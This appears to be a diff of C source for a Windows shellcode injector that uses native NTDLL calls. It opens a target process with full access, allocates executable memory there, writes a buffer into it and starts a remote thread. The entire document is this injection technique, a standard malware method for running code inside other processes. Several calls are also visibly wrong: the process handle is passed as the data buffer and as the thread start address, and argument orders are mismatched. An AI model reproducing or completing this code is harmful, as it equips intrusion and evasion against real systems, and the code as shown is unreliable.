@@ -78,9 +78,6 @@ int main(int argc, char* argv[]) {
         "NtAllocateVirtualMemory");
     const NtCreateThreadEx _NtCreateThreadEx = (NtCreateThreadEx)GetProcAddress(hNTDLL,
         "NtCreateThreadEx");
-    const NtClose _NtClose = (NtClose)GetProcAddress(hNTDLL,
-        "NtClose");
-
     int s = strlen((char*)Buf);
   if (argc < 2) {
 
@@ -98,17 +95,17 @@ int main(int argc, char* argv[]) {
     CLIENT_ID CID = { (HANDLE)PID, NULL};
 
 
-    status = NtOpenProcess(&hProc,PROCESS_ALL_ACCESS,&OA, &CID);
+    status = _NtOpenProcess(&hProc,PROCESS_ALL_ACCESS,&OA, &CID);
 
 
     i(" getting proc handle...");
     if(status != STATUS_SUCCESS) {
-        w("failed to get handle on process. 0x%x", status);
+        w("failed to get handle on process. 0x%ld", status);
         goto CLEANUP;
     }
 
     k(" process gotten!");
-    status = NtAllocateVirtualMemory(&hProc, &Buf, s,0x00001000,0x40 );
+    status = _NtAllocateVirtualMemory(&hProc, &Buf, NULL,s,0x00001000,0x40 );
 
     // h, IntPtr.Zero, 0,Buf.Length, 0x00001000, 0x40
 
@@ -116,11 +113,11 @@ int main(int argc, char* argv[]) {
 i(" allocating... ");
 
     if(status != STATUS_SUCCESS) {
-        w("failed to allocate virtual memory. 0x%x", status);
+        w("failed to allocate virtual memory. 0x%ld", status);
         goto CLEANUP;
     }
     k("allocated memory!");
-  status = NtWriteVirtualMemory(&hProc,&hProc,&Buf,s,NULL);
+  status = _NtWriteVirtualMemory(&hProc,&hProc,&Buf,s,NULL);
 
     //h, memAlloc , 0, Buf, (uint)(Buf.Length), out outout
     i("writing v mem");
@@ -131,7 +128,7 @@ i(" allocating... ");
     }
     k("wrote memory!");
 
-hThread = NtCreateThreadEx(s,&Buf, NULL,(PTHREAD_START_ROUTINE)hProc, NULL, 0, 0,0,0,NULL);
+hThread = _NtCreateThreadEx(s,&Buf, NULL,(PTHREAD_START_ROUTINE)hProc, NULL, 0, 0,0,0,NULL,NULL);
 
 
 
